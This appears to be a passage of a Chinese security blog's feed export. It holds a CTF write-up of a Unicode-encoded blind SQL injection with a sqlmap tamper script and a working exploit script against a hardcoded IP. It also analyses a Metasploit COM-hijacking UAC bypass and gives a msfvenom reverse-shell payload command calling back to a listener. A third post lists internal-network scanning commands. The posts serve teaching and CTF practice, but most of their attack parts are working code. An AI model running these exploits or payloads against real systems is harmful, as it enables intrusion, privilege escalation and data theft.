class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span><span class="params">($string)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $blacklist = <span class="string">'/union|ascii|mid|left|greatest|least|substr|sleep|or|benchmark|like|regexp|if|=|-|&lt;|&gt;|#|s/i'</span>;</span><br><span class="line">    <span class="keyword">return</span> preg_replace_callback($blacklist, <span class="function"><span class="keyword">function</span> <span class="params">($match)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'@'</span> . $match[<span class="number">0</span>] . <span class="string">'@'</span>;</span><br><span class="line">    &#125;, $string);</span><br><span class="line">&#125;</span><br><span class="line">.....</span><br><span class="line"><span class="keyword">foreach</span> ($_GET <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">    <span class="keyword">if</span> (is_string($value) &amp;&amp; !is_numeric($value)) &#123;</span><br><span class="line">        $value = safe($value);</span><br><span class="line">    &#125;</span><br><span class="line">    $_GET[$key] = $value;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">foreach</span> ($_POST <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">    <span class="keyword">if</span> (is_string($value) &amp;&amp; !is_numeric($value)) &#123;</span><br><span class="line">        $value = safe($value);</span><br><span class="line">    &#125;</span><br><span class="line">    $_POST[$key] = $value;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">foreach</span> ($_COOKIE <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">    <span class="keyword">if</span> (is_string($value) &amp;&amp; !is_numeric($value)) &#123;</span><br><span class="line">        $value = safe($value);</span><br><span class="line">    &#125;</span><br><span class="line">    $_COOKIE[$key] = $value;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>直接用一个backlist，然后将Get/POST/Cookie三种传参方式全部过滤了一遍<br>跟一下<code>real_ip()</code><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">real_ip</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $ip = <span class="keyword">isset</span>($_SERVER[<span class="string">'REMOTE_ADDR'</span>]) ? $_SERVER[<span class="string">'REMOTE_ADDR'</span>] : <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>])) &#123;</span><br><span class="line">        $list = explode(<span class="string">','</span>, $_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>]);</span><br><span class="line">        $ip = $list[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!ip2long($ip)) &#123;</span><br><span class="line">        $ip = <span class="string">''</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $ip;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>使用了ip2long来转换了ip格式，这样也没办法了..</p><p>继续审计，找有SQL交互的地方</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_COOKIE[<span class="string">"islogin"</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> ($_COOKIE[<span class="string">"login_data"</span>]) &#123;</span><br><span class="line">        $login_data = json_decode($_COOKIE[<span class="string">'login_data'</span>], <span class="keyword">true</span>);</span><br><span class="line">        $admin_user = $login_data[<span class="string">'admin_user'</span>];</span><br><span class="line">        $udata = $DB-&gt;get_row(<span class="string">"SELECT * FROM fish_admin WHERE username='$admin_user' limit 1"</span>);</span><br></pre></td></tr></table></figure><p>这里可以看到利用了一个<code>json_decode()</code>函数，将<code>$_COOKIE</code>中的login_data带入到SQL语句中:</p><p><code>SELECT * FROM fish_admin WHERE username=&#39;$admin_user&#39; limit 1</code></p><p>这里就造成了，我们可以使用unicode进行绕过，因为json_decode是可以将unicode字符解码的</p><p>那么，就可以直接bypass进行注入了</p><h2 id="0x02-Exploit"><a href="#0x02-Exploit" class="headerlink" title="0x02 Exploit"></a>0x02 Exploit</h2><p>我们只用unicode就可以绕过的话，就相当于没有过滤的注入了，可以选择使用sqlmap or 自己写脚本</p><ol><li><p>tamper</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line">__priority__ = PRIORITY.LOW</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dependencies</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tamper</span><span class="params">(payload, **kwargs)</span>:</span></span><br><span class="line">    data = <span class="string">'''&#123;"admin_user":"%s"&#125;;'''</span></span><br><span class="line">    payload = payload.lower()</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    payload = payload.replace(<span class="string">'o'</span>, <span class="string">'\u006f'</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">'u'</span>, <span class="string">'\u0075'</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">'i'</span>, <span class="string">'\u0069'</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">'\''</span>, <span class="string">'\u0027'</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">'\"'</span>, <span class="string">'\u0022'</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">' '</span>, <span class="string">'\u0020'</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">'s'</span>, <span class="string">'\u0073'</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">'#'</span>, <span class="string">'\u0023'</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">'&gt;'</span>, <span class="string">'\u003e'</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">'&lt;'</span>, <span class="string">'\u003c'</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">'-'</span>, <span class="string">'\u002d'</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">'='</span>, <span class="string">'\u003d'</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">'f1a9'</span>, <span class="string">'F1a9'</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">'f1'</span>, <span class="string">'F1'</span>)</span><br><span class="line">    <span class="keyword">return</span> data % payload</span><br></pre></td></tr></table></figure></li><li><p>python</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">url = <span class="string">"http://45.32.75.237:10000/admin/login.php"</span></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line">dic = <span class="string">"0123456789abcdefghijklmnopqrstuvwxyz&#123;&#125;_ABCDEFGHIJKLMNOPQRSTUVWXYZ!#$%&amp;()*+|,-./:;&lt;=&gt;?@"</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> dic:</span><br><span class="line">        startTime = time.time()</span><br><span class="line">        poc1 = <span class="string">"'\u006fr\u0020su\u0062str(passwo\u0072d,&#123;0&#125;,1)\u003d'&#123;1&#125;'\u0020and\u0020sl\u0065ep(6)\u0023"</span>.format(x,chr(i))</span><br><span class="line">        admin BE933CBA048A9727A2D2E9E08F5ED046</span><br><span class="line">        poc2 = <span class="string">"'\u006fr\u0020su\u0062str((select\u0020binary\u0020table_name\u0020from\u0020inf\u006frmation_schema.tables\u0020where\u0020TABLE_SCHEMA\u003ddatabase()\u0020limit\u00200,1),&#123;0&#125;,1)\u003d'&#123;1&#125;'\u0020and\u0020sl\u0065ep(6)\u0023"</span>.format(x,i)</span><br><span class="line">        <span class="comment">#F1444g</span></span><br><span class="line">        poc3 = <span class="string">"'\u006fr\u0020su\u0062str((select\u0020binary\u0020column_name\u0020from\u0020inf\u006frmation_schema.columns\u0020where\u0020TABLE_SCHEMA\u003ddatabase()\u0020limit\u00200,1),&#123;0&#125;,1)\u003d'&#123;1&#125;'\u0020and\u0020sl\u0065ep(6)\u0023"</span>.format(x,i)</span><br><span class="line">        <span class="comment">#F1a9</span></span><br><span class="line">        poc4 = <span class="string">"'\u006fr\u0020su\u0062str((select\u0020binary\u0020F1a9\u0020from\u0020F1444g\u0020limit\u00200,1),&#123;0&#125;,1)\u003d'&#123;1&#125;'\u0020and\u0020sl\u0065ep(6)\u0023"</span>.format(x,i)</span><br><span class="line">        headers = &#123;<span class="string">"Cookie"</span>:<span class="string">'islogin=1; login_data=&#123;\"admin_user\":\"'</span>+poc4+<span class="string">'\"&#125;'</span>&#125;</span><br><span class="line">        r = requests.get(url,headers=headers)</span><br><span class="line">        <span class="keyword">if</span> time.time() - startTime &gt; <span class="number">5</span>:</span><br><span class="line">            flag += i</span><br><span class="line">            <span class="keyword">print</span> flag</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x01-Analyse&quot;&gt;&lt;a href=&quot;#0x01-Analyse&quot; class=&quot;headerlink&quot; title=&quot;0x01 Analyse&quot;&gt;&lt;/a&gt;0x01 Analyse&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;/HCTF2018 Kzone Writ
      
    
    </summary>
    
    
      <category term="CTF" scheme="http://patrilic.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>bypassUAC_via_comhijacking</title>
    <link href="http://patrilic.top/2019/04/03/bypassUAC_via_comhijacking/"/>
    <id>http://patrilic.top/2019/04/03/bypassUAC_via_comhijacking/</id>
    <published>2019-04-03T05:12:49.000Z</published>
    <updated>2019-08-16T05:10:05.191Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>@Author: Patrilic<br>@Time: 2019-02-03 13:12:49<br><img src="/wallpaper/[35396]宮水の巫女-60268880.jpg" alt></p></blockquote><h2 id="0x01-Com劫持原理"><a href="#0x01-Com劫持原理" class="headerlink" title="0x01 Com劫持原理"></a>0x01 Com劫持原理</h2><p>利用CLSID搜索顺序：</p><ol><li>HKCU\Software\Classes\CLSID</li><li>HKCR\CLSID</li><li>HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\ShellCompatibility\Objects\</li></ol><p>将被劫持的CLSID存入：HKCU\Software\Classes\CLSID</p><p>CLSID 结构<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID   </span><br><span class="line"> &#123;CLSID&#125;       </span><br><span class="line">InprocServer32          (Default) = path          </span><br><span class="line">ThreadingModel     = value</span><br></pre></td></tr></table></figure></p><h2 id="0x02-uacbypass-comhijack分析"><a href="#0x02-uacbypass-comhijack分析" class="headerlink" title="0x02 uacbypass_comhijack分析"></a>0x02 uacbypass_comhijack分析</h2><p>判断系统版本</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span></span></span><br><span class="line">    <span class="keyword">if</span> sysinfo[<span class="string">'OS'</span>] =~ <span class="regexp">/Windows (7|8|10|2008|2012|2016)/</span> &amp;&amp; is_uac_enabled? <span class="comment"># 从meterpreter中判断OS版本</span></span><br><span class="line">      Exploit::CheckCode::Appears</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      Exploit::CheckCode::Safe</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">end</span></span><br></pre></td></tr></table></figure><p>劫持点：eventvwr.exe 和 mmc.exe<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">@@hijack_points = [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="symbol">name:</span> <span class="string">'Event Viewer'</span>,</span><br><span class="line">      <span class="symbol">cmd_path:</span> <span class="string">'%WINDIR%\System32\eventvwr.exe'</span>,</span><br><span class="line">      <span class="symbol">class_ids:</span> [<span class="string">'0A29FF9E-7F9C-4437-8B11-F424491E3931'</span>]</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="symbol">name:</span> <span class="string">'Computer Managment'</span>,</span><br><span class="line">      <span class="symbol">cmd_path:</span> <span class="string">'%WINDIR%\System32\mmc.exe'</span>,</span><br><span class="line">      <span class="symbol">cmd_args:</span> <span class="string">'CompMgmt.msc'</span>,</span><br><span class="line">      <span class="symbol">class_ids:</span> [<span class="string">'0A29FF9E-7F9C-4437-8B11-F424491E3931'</span>]</span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br></pre></td></tr></table></figure></p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hijack_com</span><span class="params">(registry_view, dll_path)</span></span></span><br><span class="line">    target = @@hijack_points.sample</span><br><span class="line">    target_clsid = target[<span class="symbol">:class_ids</span>].sample</span><br><span class="line">    root_key = <span class="string">"<span class="subst">#&#123;CLSID_PATH&#125;</span>\\&#123;<span class="subst">#&#123;target_clsid&#125;</span>&#125;"</span></span><br><span class="line">    inproc_key = <span class="string">"<span class="subst">#&#123;root_key&#125;</span>\\InProcServer32"</span></span><br><span class="line">    shell_key = <span class="string">"<span class="subst">#&#123;root_key&#125;</span>\\ShellFolder"</span></span><br><span class="line"></span><br><span class="line">    registry_createkey(root_key, registry_view)</span><br><span class="line">    registry_createkey(inproc_key, registry_view)</span><br><span class="line">    registry_createkey(shell_key, registry_view)</span><br><span class="line">   </span><br><span class="line">    registry_setvaldata(inproc_key, DEFAULT_VAL_NAME, dll_path, <span class="string">'REG_SZ'</span>, registry_view)</span><br><span class="line">    registry_setvaldata(inproc_key, <span class="string">'ThreadingModel'</span>, <span class="string">'Apartment'</span>, <span class="string">'REG_SZ'</span>, registry_view)</span><br><span class="line">    registry_setvaldata(inproc_key, <span class="string">'LoadWithoutCOM'</span>, <span class="string">''</span>, <span class="string">'REG_SZ'</span>, registry_view)</span><br><span class="line">    registry_setvaldata(shell_key, <span class="string">'HideOnDesktop'</span>, <span class="string">''</span>, <span class="string">'REG_SZ'</span>, registry_view)</span><br><span class="line">    registry_setvaldata(shell_key, <span class="string">'Attributes'</span>, <span class="number">0xf090013d</span>, <span class="string">'REG_DWORD'</span>, registry_view)</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="symbol">name:</span>     target[<span class="symbol">:name</span>],</span><br><span class="line">      <span class="symbol">cmd_path:</span> target[<span class="symbol">:cmd_path</span>],</span><br><span class="line">      <span class="symbol">cmd_args:</span> target[<span class="symbol">:cmd_args</span>],</span><br><span class="line">      <span class="symbol">root_key:</span> root_key</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">end</span></span><br></pre></td></tr></table></figure><p>向注册表添加</p><blockquote><p>HKCU\Software\Classes\CLSID{0A29FF9E-7F9C-4437-8B11-F424491E3931}\InProcServer32<br>HKCU\Software\Classes\CLSID{0A29FF9E-7F9C-4437-8B11-F424491E3931}\ShellFolder</p></blockquote><p>InProcServer 中：</p><ul><li>Default -&gt; dll_path</li><li>ThreadingModel -&gt; Apartment</li><li>LoadWithoutCOM -&gt; Null</li></ul><p>ShellFolder 中：</p><ul><li>HideOnDesktop -&gt; Null</li><li>Attributes -&gt; 0xf090013d</li></ul><h2 id="0x03-复现"><a href="#0x03-复现" class="headerlink" title="0x03 复现"></a>0x03 复现</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=10.131.36.131 lport=4444 -f exe &gt; out.exe</span><br></pre></td></tr></table></figure><p><img src="/无标题.resources/0E2986DD-BCFB-443E-AFB1-884B8BBB60EF.png" alt="7b0554d147b29f2ea26ae50de761fd1a"><br>回弹拿到meterpreter session</p><p><img src="/无标题.resources/14E6038F-66BC-4AD3-9AC5-60A3B370D8A3.png" alt="2e3c6b217fb1c0f6eb5ee8e7e645c081"></p><p>无法getsystem</p><p><img src="/无标题.resources/F2BE433B-9D87-4A45-925C-701F6E351B27.png" alt="141b1b876500404f9687d93866b5a8e2"></p><p>可以看到，劫持了CLSID {0A29FF9E-7F9C-4437-8B11-F424491E3931}的会话，成功拿到反弹session</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;@Author: Patrilic&lt;br&gt;@Time: 2019-02-03 13:12:49&lt;br&gt;&lt;img src=&quot;/wallpaper/[35396]宮水の巫女-60268880.jpg&quot; alt&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h
      
    
    </summary>
    
    
      <category term="内网渗透" scheme="http://patrilic.top/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>内网主机发现</title>
    <link href="http://patrilic.top/2019/04/03/%E5%86%85%E7%BD%91%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0/"/>
    <id>http://patrilic.top/2019/04/03/内网主机发现/</id>
    <published>2019-04-03T03:59:32.000Z</published>
    <updated>2019-08-16T05:18:50.689Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>@Author: Patrilic<br>@Time: 2019-02-03 11:59:32<br><img src="/wallpaper/[31894]from here-58445343.png" alt></p></blockquote><h2 id="0x01-发现内网存活主机"><a href="#0x01-发现内网存活主机" class="headerlink" title="0x01 发现内网存活主机"></a>0x01 发现内网存活主机</h2><h3 id="1-1-基于ARP发现内网主机"><a href="#1-1-基于ARP发现内网主机" class="headerlink" title="1.1 基于ARP发现内网主机"></a>1.1 基于ARP发现内网主机</h3><h4 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sn -PR 10.253.6.0/24</span><br></pre></td></tr></table></figure><h4 id="powershell"><a href="#powershell" class="headerlink" title="powershell"></a>powershell</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Patrilic\Desktop&gt;powershell -exec bypass -Command &quot;Import-Module ./Invoke-ARPScan.ps1;Invoke-ARPScan -CIDR 192.168.121.1/24&quot;</span><br></pre></td></tr></table></figure><p><img src="/内网主机发现.resources/F4D8B735-47A4-47AE-8C52-6EC48D0A494D.png" alt="b535427cfa8bff645f941c761de208ee"></p><p>Invoke-ARPScan 是Empire中的模块</p><h4 id="arp-scan-exe"><a href="#arp-scan-exe" class="headerlink" title="arp-scan.exe"></a>arp-scan.exe</h4><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\<span class="title">Users</span>\<span class="title">Patrilic</span>\<span class="title">Desktop</span>&gt;<span class="title">arp</span>-<span class="title">scan.exe</span> -<span class="title">t</span> 192.168.121.0/24</span></span><br></pre></td></tr></table></figure><p><img src="/内网主机发现.resources/B32AA3E3-6152-4659-A9B3-9D90AF18DB15.png" alt="1f8e2f46692be0db78c4aa872061312c"></p><h4 id="arp-ping-exe"><a href="#arp-ping-exe" class="headerlink" title="arp-ping.exe"></a>arp-ping.exe</h4><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\<span class="title">Users</span>\<span class="title">Patrilic</span>\<span class="title">Desktop</span>&gt;<span class="title">arp</span>-<span class="title">ping.exe</span> 192.168.121.1</span></span><br></pre></td></tr></table></figure><p><img src="/内网主机发现.resources/F9D157F9-667C-4A56-A2E1-84A0B9E89B14.png" alt="017bf04412ca847df46101caadf1c928"></p><h4 id="Empire"><a href="#Empire" class="headerlink" title="Empire"></a>Empire</h4><h4 id="netdiscover"><a href="#netdiscover" class="headerlink" title="netdiscover"></a>netdiscover</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netdiscover -r 192.168.3.0/24 -i eth0</span><br></pre></td></tr></table></figure><p><img src="/内网主机发现.resources/505FE0B8-6242-4894-ACEA-F131AFC3DFC9.png" alt="f40948147bbe5919da12d82a559b56d9"></p><h4 id="meterpreter"><a href="#meterpreter" class="headerlink" title="meterpreter"></a>meterpreter</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; getsystem</span><br><span class="line">meterpreter &gt; run post/windows/gather/arp_scanner RHOSTS=10.253.6.1/24</span><br></pre></td></tr></table></figure><p><img src="/内网主机发现.resources/012C3ADD-CD53-42DE-B40E-8459DB9382CC.png" alt="6189badfb2a72fed6459edba892064ba"></p><h4 id="Cain等"><a href="#Cain等" class="headerlink" title="Cain等"></a>Cain等</h4><h3 id="1-2-基于icmp发现主机"><a href="#1-2-基于icmp发现主机" class="headerlink" title="1.2 基于icmp发现主机"></a>1.2 基于icmp发现主机</h3><h4 id="cmd"><a href="#cmd" class="headerlink" title="cmd"></a>cmd</h4><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\<span class="title">Users</span>\<span class="title">Patrilic</span>\<span class="title">Desktop</span>&gt;<span class="title">for</span> /<span class="title">L</span> %<span class="title">I</span> <span class="title">in</span> (1,1,254) <span class="title">DO</span> @<span class="title">ping</span> -<span class="title">w</span> 1 -<span class="title">n</span> 1 192.168.121.%<span class="title">I</span> | <span class="title">findstr</span> "<span class="title">TTL</span>="</span></span><br></pre></td></tr></table></figure><p><img src="/内网主机发现.resources/11FE87F8-DFC5-4F24-A6AE-59B567853401.png" alt="96cb8bb61bf9e88c2a3a7bda7547807d"></p><h4 id="nmap-1"><a href="#nmap-1" class="headerlink" title="nmap"></a>nmap</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sn -PE 192.168.3.0/24</span><br></pre></td></tr></table></figure><p><img src="/内网主机发现.resources/193C3160-17B2-4BB2-A178-0115E0326584.jpg" alt="89c3bc440d2446f15121c4bcce576ca9"></p><h4 id="powershell-1"><a href="#powershell-1" class="headerlink" title="powershell"></a>powershell</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe -exec bypass -Command <span class="string">"Import-Module C:\Invoke-TSPingSweep.ps1;Invoke-TSPingSweep -StartAddress 192.168.3.1 -EndAddress 192.168.3.254 -ResolveHost -ScanPort -Port 21,22,23,25,53,80,81,82,83,84,85,86,87,88,89,110,111,143,389,443,445,873,1025,1433,1521,2601,3306,3389,3690,5432,5900,7001,8000,8080,8081,8082,8083,8084,8085,8086,8087,8089,9090,10000"</span></span><br></pre></td></tr></table></figure><p><img src="/内网主机发现.resources/F9F443E0-8516-4F3A-9036-369D557F9743.png" alt="cf17177493ff1f7678825dca8a46b76c"></p><h4 id="bash"><a href="#bash" class="headerlink" title="bash"></a>bash</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ip <span class="keyword">in</span> 10.131.36.&#123;1..254&#125; </span><br><span class="line"><span class="keyword">do</span> </span><br><span class="line">   ping <span class="variable">$ip</span> -c 1 &amp;&gt; /dev/null </span><br><span class="line">   <span class="keyword">if</span> [ $? -eq 0 ];<span class="keyword">then</span> </span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$ip</span> is alive .... </span><br><span class="line">   <span class="keyword">fi</span> </span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure><p><img src="/内网主机发现.resources/AD2CCDBE-6B28-4064-8129-BD3DE928C01C.png" alt="573f9b41753a8eb36b56b062c2aa1fab"></p><h3 id="1-3-基于netbios协议发现主机"><a href="#1-3-基于netbios协议发现主机" class="headerlink" title="1.3 基于netbios协议发现主机"></a>1.3 基于netbios协议发现主机</h3><h4 id="cmd-1"><a href="#cmd-1" class="headerlink" title="cmd"></a>cmd</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nbtstat -n</span><br></pre></td></tr></table></figure><p><img src="/内网主机发现.resources/9F50A42F-3516-4BA2-9C40-BA246B49B226.png" alt="ae9d6dd415b464302a342a0e9b30c5c4"></p><h4 id="nbtscan"><a href="#nbtscan" class="headerlink" title="nbtscan"></a>nbtscan</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nbtscan-1.0.35.exe -m 192.168.121.0/24</span><br></pre></td></tr></table></figure><p><img src="/内网主机发现.resources/D0C9CDA1-7F52-4888-BAF3-A3CAC81214BC.png" alt="6a39cc10cd8c0f7b2a96d570c03d811a"></p><h4 id="nmap-2"><a href="#nmap-2" class="headerlink" title="nmap"></a>nmap</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sU --script nbstat.nse -p137 192.168.1.0/24 -T4</span><br></pre></td></tr></table></figure><p><img src="/内网主机发现.resources/31F8DB2A-6859-444C-B91B-E1FDA3090859.png" alt="b7d36bfa324e4c6fecc134c750ec6f82"></p><h3 id="1-4-基于smb协议发现主机"><a href="#1-4-基于smb协议发现主机" class="headerlink" title="1.4 基于smb协议发现主机"></a>1.4 基于smb协议发现主机</h3><h4 id="nmap-3"><a href="#nmap-3" class="headerlink" title="nmap"></a>nmap</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap ‐sU ‐sS ‐‐script smb‐enum‐shares.nse ‐p445 192.168.1.119/24</span><br></pre></td></tr></table></figure><p><img src="/内网主机发现.resources/795DA407-659D-418D-A180-B10BB210C477.png" alt="856a0cc32348f1b49cb80a4a98303498"></p><h4 id="cmd-2"><a href="#cmd-2" class="headerlink" title="cmd"></a>cmd</h4><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> /l %a <span 